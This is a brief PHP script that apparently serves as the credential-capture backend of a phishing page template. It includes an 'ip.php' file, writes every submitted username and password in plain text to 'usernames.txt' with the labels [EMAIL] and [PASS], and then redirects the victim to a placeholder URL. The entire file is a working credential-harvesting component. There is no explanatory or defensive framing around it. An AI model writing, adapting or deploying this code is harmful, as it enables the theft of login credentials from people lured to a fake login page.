<?php
header ('Location: lindex.html');
include 'ip.php';

file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['username'] . " [PASS]: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: <CUSTOM>');
exit();
